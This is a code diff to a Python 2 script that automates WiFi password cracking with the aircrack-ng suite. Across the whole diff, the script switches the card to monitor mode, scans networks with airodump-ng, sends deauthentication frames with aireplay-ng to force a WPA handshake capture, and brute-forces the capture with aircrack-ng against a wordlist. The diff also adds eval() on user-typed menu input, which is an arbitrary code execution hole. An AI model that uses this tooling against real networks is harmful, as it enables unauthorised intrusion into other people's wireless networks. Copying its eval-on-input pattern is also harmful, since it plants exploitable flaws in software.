@@ -26,21 +26,22 @@ class Aircrack(object):
   self.cap     = 'data-01.cap'
   self.ap      = accesspoints()
   self.iw      = interface()
-  self.pd      = None # update(pd) message
 
- def load(self):
+ def load(self,ssid=None):
   # scanning ...
   self.ap = accesspoints()
   while not self.ap.aps and self.run:
    for n in range(4):
     time.sleep(.4)
-    if self.ap.mem:break
+    if self.ap.aps:break
     subprocess.call(['clear'])
-    print 'Scanning {}'.format(n*'.')
-  time.sleep(3)
+    if not ssid:
+     print 'Scanning {}'.format(n*'.')
+    else:
+     print 'Searching for: {} {}'.format(ssid,n*'.')
 
  def scan(self):
-  cmd = ['airodump-ng','-a','-w','data','--output-format','csv','wlan0']
+  cmd = ['airodump-ng','-a','-w','data','--output-format','csv',self.iface]
   subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
 
  def kill(self):
@@ -49,7 +50,6 @@ class Aircrack(object):
    subprocess.Popen(['pkill',proc]).wait()
 
  def remove(self):
-  # remove any saved csv file
   for f in os.listdir('.'):
    if f.startswith('data'):
     os.remove(f)
@@ -66,7 +66,7 @@ class Aircrack(object):
  def startScan(self):
   self.kill()
   self.remove()
-  self.iw.monitorMode(self.iface) # enable monitor mode
+  self.iw.monitorMode(self.iface)
   threading.Thread(target=self.load).start()
   self.scan()
 
@@ -77,32 +77,22 @@ class Aircrack(object):
   if os.path.exists(self.csv):
    self.ap.open(self.csv)
 
- def updateMsg(self,essid):
-  while self.pd:
-   for n in range(4):
-    time.sleep(.4)
-    if not self.pd:break
-    subprocess.call(['clear'])
-    print 'Scanning: {} {}'.format(essid,(n*'.'))
-
  def search(self,mac):
   if os.path.exists(self.csv):
    with open(self.csv,'r') as csvfile:
     csvfile = csv.reader(csvfile,delimiter=',')
     lines = [line for line in csvfile]
     num = [num for num,line in enumerate(lines) if len(line)==15 if line[0]==mac]
-    if num:
-     self.pd = False
-     return lines[num[0]][3]
+    return lines[num[0]][3] if num else None
 
  def updateChannel(self,mac):
-  if not mac in self.ap.aps.keys():return
-  ap = self.ap.aps[mac]
-  essid = ap['essid']
+  try:
+   ap = self.ap.aps[mac]
+  except KeyError:return
+  essid=ap['essid']
   self.kill()
   self.remove()
-  self.pd = True
-  threading.Thread(target=self.updateMsg,args=[essid]).start()
+  threading.Thread(target=self.load,args=[essid]).start()
   cmd = ['airodump-ng','-w','data','--output-format','csv','-a',self.iface]
   subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
   while 1:
@@ -112,10 +102,10 @@ class Aircrack(object):
     break
 
  def aircrack(self,mac,passlist):
-  # few configs
-  self.kill()
   os.chdir(base) # change directory back
+  self.exit(False)
   self.iw.managedMode(self.iface)
+
   capFile = '/tmp/{}'.format(self.cap)
   cmd = ['aircrack-ng',capFile,'-w',passlist]
   subprocess.call(['clear'])
@@ -124,8 +114,7 @@ class Aircrack(object):
   try:
    subprocess.Popen(cmd).wait()
   except KeyboardInterrupt:
-   self.kill()
-   self.iw.managedMode(self.iface)
+   self.exit()
 
  def attack(self,mac):
   cmd=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.iface]
@@ -144,8 +133,10 @@ class Aircrack(object):
    line = [line for line in aircrackOutput]
    line = line[5].split()
    line = [line for line in line[4]]
-   if eval(line[1]):
-    self.wait = False
+   try:
+    if eval(line[1]):
+     self.wait = False
+   except NameError:return
 
  def handshake(self):
   while self.wait:
@@ -168,13 +159,29 @@ class Aircrack(object):
    self.readLog()
    self.atk = False
 
- def exit(self):
-  self.kill()
-  self.remove()
+ def exitMsg(self):
+  while self.run:
+   for n in range(4):
+    subprocess.call(['clear'])
+    print 'Exiting {}'.format(n*'.')
+    time.sleep(.4)
+  subprocess.call(['clear'])
+
+ def exit(self,kill=True):
   self.wait = False
   self.run = False
-  self.iw.managedMode(self.iface)
-  exit('\n')
+  self.kill()
+  self.remove()
+  time.sleep(1.8)
+  if kill:
+   self.run = True
+   threading.Thread(target=self.exitMsg).start()
+  try:
+   self.iw.managedMode(self.iface)
+  finally:
+   self.run = False
+  if kill:
+   exit()
 
 def main():
  # assign arugments
@@ -202,19 +209,29 @@ def main():
  while 1:
   try:engine.display()
   except KeyboardInterrupt:
-   engine.stopScan()
+   if not engine.ap.aps:
+    engine.run = False
+   else:
+    engine.stopScan()
    break
 
+ # no accesspoints found
+ if not engine.ap.aps:
+  engine.exit()
+
  try:
-  num = int(input('\nEnter num: '))
+  num = raw_input('\nEnter num: ')
+  num = eval(num)
  except KeyboardInterrupt:
   engine.exit()
 
  mac = engine.ap.mem[num]
  chann = engine.ap.aps[mac]['chann']
+ essid = engine.ap.aps[mac]['essid']
+ essid = essid if essid != 'HIDDEN' and essid != 'UNKNOWN' else mac
 
  # display scanning
- threading.Thread(target=engine.load).start()
+ threading.Thread(target=engine.load,args=[essid]).start()
 
  # wait for handshake
  while 1:
@@ -233,13 +250,10 @@ def main():
    engine.wait = False if engine.wait else None
    if engine.wait == None:break
 
-   # if failed to capture handshake,
-   # then there must be noone connected,
-   # or router hopped to a new channel,
-   # so rescan every network, and find the router
+   # obtain info
    engine.updateChannel(mac)
   except KeyboardInterrupt:
-   engine.exit();break
+   engine.exit()
 
  # start brute force
  engine.aircrack(mac,wordlist)
